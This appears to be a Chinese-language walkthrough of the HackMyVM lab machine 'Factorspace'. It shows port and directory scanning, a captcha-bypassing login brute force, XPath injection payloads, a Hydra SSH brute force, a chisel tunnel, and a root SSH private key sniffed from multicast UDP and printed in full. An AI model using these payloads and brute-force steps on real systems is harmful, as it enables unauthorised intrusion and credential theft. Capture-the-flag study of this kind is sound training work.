---
title: Factorspace
author: hgbe02
date: 2024-04-30
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Factorspace.html"
---

# Factorspace

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300009618.png" alt="image-20240428124226481" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300009666.png" alt="image-20240429200313829" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/factorspace]
└─$ rustscan -a 192.168.0.101 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.101:80
Open 192.168.0.101:22

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQGwzNlaaGEELNmSaaA5KPNGnxOCBP8oa7QB1kl8hkIrIGanBlB8e+lifNATIlUM57ReHEaoIiJMZLQlMTATjzQ3g76UxpkRMSfFMfjOwBr3T9xAuggn11GkgapKzgQXop1xpVnpddudlA2DGT56xhfAefOoh9LV/Sx5gw/9sH+YpjYZNn4WYrfHuIcvObaa1jE7js8ySeIRQffj5n6wX/eq7WbohB6yFcLb1PBvnfNhvqgyvwcCWiwZoNhRMa+0ANpdpZyOyKQcbR51w36rmgJI0Y9zLIyjHvtxiNuncns0KFvlnS3JXywv277OvJuqhH4ORvXM9kgSKebGV+/5R0D/kFmUA0Q4o1EEkpwzXiiUTLs6j4ZwNojp3iUVWT6Wb7BmnxjeQzG05LXkoavc63aNf+lcSh9mQsepQNo5aHlHzMefPx/j2zbjQN8CHCxOPWLTcpFlyQSZjjnpGxwYiYyqUZ0sF8l9GWtj6eVgeScGvGy6e0YTPG9/d6o2oWdMM=
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFwHzjIh47PVCBqaldJCFibsrsU4ERboGRj1+5RNyV5zFxNTNpdu8f/rNL9s0p7zkqERtD2xb4zBIl6Vj9Fpdxw=
|   256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOUM7hNt+CcfC4AKOuJumfdt3GCMSintNt9k0S2tA1XS
80/tcp open  http    syn-ack Apache httpd 2.4.56 ((Debian))
|_http-title: industrial
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/factorspace]
└─$ gobuster dir -u http://192.168.0.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.101/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,zip,bak,jpg,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://192.168.0.101/images/]
/index.html           (Status: 200) [Size: 19579]
/.html                (Status: 403) [Size: 278]
/login.php            (Status: 200) [Size: 2346]
/icon                 (Status: 301) [Size: 313] [--> http://192.168.0.101/icon/]
/results.php          (Status: 302) [Size: 115] [--> login.php]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.101/css/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.101/js/]
/check.php            (Status: 302) [Size: 0] [--> login.php]
/auth.php             (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 314] [--> http://192.168.0.101/fonts/]
/parent               (Status: 301) [Size: 315] [--> http://192.168.0.101/parent/]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300009662.png" alt="image-20240429200723054" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300010112.png" alt="image-20240429200742457" style="zoom:33%;" />

### 敏感目录

```bash
http://192.168.0.101/login.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300010753.png" alt="image-20240429201240105" style="zoom:50%;" />

### 爆破登录界面

尝试抓包爆破，这个验证码是个大问题。。。

```bash
POST /auth.php HTTP/1.1
Host: 192.168.0.101
Content-Length: 41
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.101
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.101/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=jhiqb25kegkusqq6643e2n75f6
Connection: close

username=hack&password=hack&captcha=Y7MB3
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300010281.png" alt="image-20240429204935150" style="zoom: 50%;" />

得到密码：

```apl
admin
iloveyou
```

### XPATH注入

为啥可以爆破？难道验证码没有刷新？进去以后：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300010764.png" alt="image-20240429205207794" style="zoom:50%;" />

发现，尝试其他的：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300010408.png" alt="image-20240429205232579" style="zoom:50%;" />

尝试sql注入？

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300010529.png" alt="image-20240429205256199" style="zoom:50%;" />

阔以！！！！！尝试抓包注入，发现错误：

```bash
POST /results.php HTTP/1.1
Host: 192.168.0.101
Content-Length: 13
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.101
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.101/employee_search_filter.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=ekeq3kgetlt1gfgjhq3admuamf; 5f5b5a7677756d5c5b5a593931383736=true
Connection: close

lastname=flag
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300010491.png" alt="image-20240429210721368" style="zoom:50%;" />

看师傅们的`blog`发现这其实是 [XPATH](https://book.hacktricks.xyz/pentesting-web/xpath-injection) 注入。。。。

```bash
1' or 1=1]/lastname | //exp[exp='
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300010795.png" alt="image-20240429211602412" style="zoom:50%;" />

```bash
1' or 1=1]/* | //exp[exp='
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300010576.png" alt="image-20240429211623325" style="zoom:50%;" />

尝试爆破登录：

```apl
Doe
doe
john
John
chan
Chan
jackie
Jackie
Lee
lee
David
david

secret123
qyxG27KGkW0x9SJ1
qwerty789
```

爆破一下：

```bash
┌──(kali💀kali)-[~/temp/factorspace]
└─$ hydra -L user.txt -P pass.txt ssh://192.168.0.101                                                                                           
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-29 09:20:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:12/p:3), ~3 tries per task
[DATA] attacking ssh://192.168.0.101:22/
[22][ssh] host: 192.168.0.101   login: jackie   password: qyxG27KGkW0x9SJ1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-29 09:20:40
```

尝试进行登录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300010297.png" alt="image-20240429212120058" style="zoom: 50%;" />

## 提权

### 信息搜集

```bash
jackie@factorspace:~$ ls -la
total 32
drwxr-xr-x 4 jackie jackie 4096 May  8  2023 .
drwxr-xr-x 3 root   root   4096 Apr  6  2023 ..
lrwxrwxrwx 1 root   root      9 Apr  6  2023 .bash_history -> /dev/null
-rw-r--r-- 1 jackie jackie  220 Apr 14  2023 .bash_logout
-rw-r--r-- 1 jackie jackie 3526 Apr 14  2023 .bashrc
drwxr-xr-x 3 jackie jackie 4096 Apr 14  2023 .local
-rw-r--r-- 1 jackie jackie  809 Apr 14  2023 .profile
drwx------ 2 jackie jackie 4096 Apr 14  2023 .ssh
-rwx------ 1 jackie jackie   33 Apr 14  2023 user.txt
jackie@factorspace:~$ cat user.txt 
eb7d964a2a41006bb325cf822db664be
jackie@factorspace:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
jackie@factorspace:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
jackie@factorspace:~$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
jackie:x:1000:1000:,,,:/home/jackie:/bin/bash
jackie@factorspace:~$ ss -tnlup
Netid          State           Recv-Q          Send-Q                   Local Address:Port                   Peer Address:Port         Process          
udp            UNCONN          0               0                            224.1.1.1:5555                        0.0.0.0:*                             
udp            UNCONN          0               0                              0.0.0.0:68                          0.0.0.0:*                             
tcp            LISTEN          0               128                            0.0.0.0:22                          0.0.0.0:*                             
tcp            LISTEN          0               511                                  *:80                                *:*                             
tcp            LISTEN          0               128                               [::]:22                             [::]:*                             
jackie@factorspace:~$ nc 224.1.1.1 5555
(UNKNOWN) [224.1.1.1] 5555 (?) : Network is unreachable
```

还是udp，尝试进行转发：https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#port-forwarding

```bash
./chisel client 192.168.0.143:5555 R:5555:224.1.1.1:5555
```

![image-20240429233932767](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300011233.png)

基础忒差了，呜呜呜，参考https://zhuanlan.zhihu.com/p/549967085

```bash
┌──(kali💀kali)-[~/temp/factorspace]
└─$ sudo tcpdump -i eth1 udp           
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
11:46:51.756089 IP factorspace.rplay > 224.1.1.1.rplay: UDP, length 2601
11:46:51.756090 IP factorspace > 224.1.1.1: udp
11:46:51.813020 IP kali.43047 > 192.168.0.1.domain: 30852+ PTR? 1.1.1.224.in-addr.arpa. (40)
11:46:52.169564 IP 192.168.0.1.domain > kali.43047: 30852 NXDomain* 0/1/0 (97)
11:46:52.169757 IP kali.37799 > 192.168.0.1.domain: 4090+ PTR? 101.0.168.192.in-addr.arpa. (44)
11:46:52.177404 IP 192.168.0.1.domain > kali.37799: 4090* 1/0/0 PTR factorspace. (69)
11:46:52.177744 IP kali.41998 > 192.168.0.1.domain: 60027+ PTR? 1.0.168.192.in-addr.arpa. (42)
11:46:52.207927 IP 192.168.0.1.domain > kali.41998: 60027 NXDomain* 0/1/0 (97)
11:46:52.208141 IP kali.59483 > 192.168.0.1.domain: 7399+ PTR? 143.0.168.192.in-addr.arpa. (44)
11:46:52.212413 IP 192.168.0.1.domain > kali.59483: 7399* 1/0/0 PTR kali. (62)
11:46:53.759177 IP factorspace.rplay > 224.1.1.1.rplay: UDP, length 2601
11:46:53.759177 IP factorspace > 224.1.1.1: udp
11:46:54.689892 IP QC-20210627LTVJ.58647 > 192.168.0.1.domain: 30733+ A? sgp-01-16A0E.pigsmightfly.pro. (47)
11:46:54.727900 IP 192.168.0.1.domain > QC-20210627LTVJ.58647: 30733 4/6/10 CNAME gtm-sg-dza3gmqkq03.pigscanfly.pro., A 120.232.198.240, A 125.88.148.71, A 125.88.148.72 (512)
11:46:54.757934 IP kali.55213 > 192.168.0.1.domain: 39232+ PTR? 152.0.168.192.in-addr.arpa. (44)
11:46:54.767302 IP 192.168.0.1.domain > kali.55213: 39232* 1/0/0 PTR QC-20210627LTVJ. (73)
11:46:55.760827 IP factorspace.rplay > 224.1.1.1.rplay: UDP, length 2601
11:46:55.760827 IP factorspace > 224.1.1.1: udp
11:46:57.763210 IP factorspace.rplay > 224.1.1.1.rplay: UDP, length 2601
11:46:57.770028 IP factorspace > 224.1.1.1: udp
11:46:59.765756 IP factorspace.rplay > 224.1.1.1.rplay: UDP, length 2601
11:46:59.765757 IP factorspace > 224.1.1.1: udp
^C
22 packets captured
22 packets received by filter
0 packets dropped by kernel
```

发现确实在发送消息，查看一下：

```bash
┌──(kali💀kali)-[~/temp/factorspace]
└─$ sudo tcpdump -i eth1 udp and dst 224.1.1.1 and port 5555 -vvv
tcpdump: listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
11:56:30.276525 IP (tos 0x0, ttl 1, id 5436, offset 0, flags [+], proto UDP (17), length 1500)
    factorspace.rplay > 224.1.1.1.rplay: UDP, length 2601
11:56:32.277076 IP (tos 0x0, ttl 1, id 5822, offset 0, flags [+], proto UDP (17), length 1500)
    factorspace.rplay > 224.1.1.1.rplay: UDP, length 2601
11:56:34.278655 IP (tos 0x0, ttl 1, id 5965, offset 0, flags [+], proto UDP (17), length 1500)
    factorspace.rplay > 224.1.1.1.rplay: UDP, length 2601
11:56:36.280565 IP (tos 0x0, ttl 1, id 6255, offset 0, flags [+], proto UDP (17), length 1500)
    factorspace.rplay > 224.1.1.1.rplay: UDP, length 2601
^C
4 packets captured
4 packets received by filter
0 packets dropped by kernel
```

阔以，使用wireshark进行查看：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300011556.png" alt="image-20240430000053564" style="zoom:50%;" />

私钥！！！！进行保存，但是复制不下来，进行转换然后转回来！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300011408.png" alt="image-20240430000252089" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404300011848.png" alt="image-20240430000318091" style="zoom:50%;" />

拿下私钥！！！

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt7C5Q3oTUF0g/0E0ml7PSWDmXh9aQDI6ph2oH1JmYXooVk0ACYBk
nqhM/GBDGmPibjbF7caE+Hgj9FhaE8eCgDznlBXtPouIqaWsN3RHkKZT0qV62G2CRpEHD0
KFY9H4OnkhuHIDIWhioVvbz1kKVG1w/Ys/KPIcLeTzYpsPyeOD9U62IcOuZ5V4Zk7scjnU
jv9uu22JoY9/qg6fIaB63IwJE097udtYc3WCR1RwMP3ePST7MKLm7ZcYyRsGm8iyMhuoDq
IrCLHdMouMDiJaB1jse9SAOZwjyIBQb/NBReydO8RK0JWw6UvGiIH8jlpnpjt6LSKeYKCy
JciSQeBtl7JgI/xO1e/wO5tygA991PD3G1u0/POeXgHsYNbSLq1IgzloS99J8lanEdTALR
KY/ZWnYDN6zvW6MGR+5MgX1gFGeKMqv01ho/RYeKG6QvSk5di0o27jdvbsWVE6nZeaYO4V
t3obvpgZsynzoRb5vWJl3q/Zy/ymzlnPYYSD3wgNAAAFiJQFmimUBZopAAAAB3NzaC1yc2
EAAAGBALewuUN6E1BdIP9BNJpez0lg5l4fWkAyOqYdqB9SZmF6KFZNAAmAZJ6oTPxgQxpj
4m42xe3GhPh4I/RYWhPHgoA855QV7T6LiKmlrDd0R5CmU9KlethtgkaRBw9ChWPR+Dp5Ib
hyAyFoYqFb289ZClRtcP2LPyjyHC3k82KbD8njg/VOtiHDrmeVeGZO7HI51I7/brttiaGP
f6oOnyGgetyMCRNPe7nbWHN1gkdUcDD93j0k+zCi5u2XGMkbBpvIsjIbqA6iKwix3TKLjA
4iWgdY7HvUgDmcI8iAUG/zQUXsnTvEStCVsOlLxoiB/I5aZ6Y7ei0inmCgsiXIkkHgbZey
YCP8TtXv8DubcoAPfdTw9xtbtPzznl4B7GDW0i6tSIM5aEvfSfJWpxHUwC0SmP2Vp2Azes
71ujBkfuTIF9YBRnijKr9NYaP0WHihukL0pOXYtKNu43b27FlROp2XmmDuFbd6G76YGbMp
86EW+b1iZd6v2cv8ps5Zz2GEg98IDQAAAAMBAAEAAAGAB64H0N5luFJscr+TJ3EXUYYPm5
fL+isfcJqE0OptBV5KGXGWss7/ZfK7ZUHRDGVorhr0I4DNRmYferPG8FTDDAF/3R0dkiPb
TtxyWs8tvsp1brUkcbACZljh5q1tTkMVEbzGwCNkJh1rIjvo8L5URDtfIfqUZW3Z58FOu6
yn+FTey37C9p5ryEDji8N49z2buW7MfmGSA4MwXzfFR26iNF5Wcsw77AVTqWAcVkcdea7j
f8LwDZSB+yT6EE5k9FZrqqrokMJ3sarLFbSreicFaZdprCVdq0v7bqW8/nL11rcP1aJYig
frWvV2Ws9c6PRDdrxDPvK6O2syv0jTnwe3MZZfY/quuH5QefzNZJ6b/hcU2DOjDhE17nQQ
78dI7pcKyg/3eZwjmqTgSuvbSzcJhx+6EkC8tB4EG+VLBSQvGxUzQsDKQ5WPajnc8wk95a
45mLZwacsXUep8CqCy+oIuzFhZmOpXJKc5YYKKIaXluJ9/Cawr6SWGGPPe8yve0G6xAAAA
wQCrWWMwu/elmBWoru6oLs4HBgDemGwuQIwoJrloWqNv6NKflOfl4H9MFtL3upMZhWVvxh
5X13gyb0kFUYDl0hMOn+u6jSyCaiHBVY0T4koViJ3HRZE7Txgz4YNKew5fduad7u18FFjr
7ZzuEx5l4tTPZ0/pDLQUdborkLGDAe/sVTczBBGQpLx1ibNqm4lD3xAl+1BuEGTm7o9yoE
79wKsBQsfbJWE4XNR+LJOoRbE5U6D01bQ7eJCWIwRfOB6MqOoAAADBAOXAhvv9mQSyKL8Q
DCW585HXY90Dd9ShP6XgGJ93+HjNCREn0fECRuaVfdTNf1ZpDqBLedXyMglY9sEQGPddSE
/ZKfhYvZl77fhC3+DgAjIUC3o0ENZYBmz5pEcXN/mzRps0vuRC4CexOkz4R5y/rHv3+37u
bG3VgvaqM7TcpQ/ytJQ6gzSZZoRMvHIlfXguTloL0wJiuvhFHhPjftw68vMqC4iXPeV+59
WDxS84DetVPnB6eeCkj7nNwbH/WYH9owAAAMEAzK0LzTiFq5Fi7tV0zmM1cbEQslcHlciO
rknr7mI308Qm+XMo3IsQDFo5ukWFCX3UEkvAgfueOCCpmLU2aHjY62SEzmNok867me4eoo
x7kiHI8LZ5A3P6orzYvunEQy4zIm9nG8gGfrxSQOxVhUSnKmvayLcjmg0iffzq6bv2ZHyZ
XvwuDAcKd1wxzdk1C2rX9BDLLxvAIde+GOLup9cc6kuFBQj7F6miqVXdVFgQ9RFL8jTaYI
8ZF1pbgmjzZd6PAAAAEHJvb3RAZmFjdG9yc3BhY2UBAg==
-----END OPENSSH PRIVATE KEY-----
```

只有root账户了，尝试切换：

```bash
┌──(kali💀kali)-[~/temp/factorspace]
└─$ chmod 600 root                 

┌──(kali💀kali)-[~/temp/factorspace]
└─$ ssh root@192.168.0.101 -i root
Linux factorspace 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon May  8 16:29:25 2023
root@factorspace:~# ls -la
total 28
drwx------  4 root root 4096 May  8  2023 .
drwxr-xr-x 18 root root 4096 Feb  6  2023 ..
lrwxrwxrwx  1 root root    9 Apr  6  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root  572 Apr 14  2023 .bashrc
drwxr-xr-x  3 root root 4096 Apr 14  2023 .local
-rw-r--r--  1 root root  161 Apr 14  2023 .profile
-rwx------  1 root root   33 Apr 14  2023 root.txt
drwx------  2 root root 4096 Apr 14  2023 .ssh
```

拿下rootshell！！！！

## 参考

https://www.bilibili.com/video/BV1cD421j7MM/

https://www.youtube.com/watch?v=pY4pbQ0mC4w

https://blog.csdn.net/qq_34942239/article/details/137158217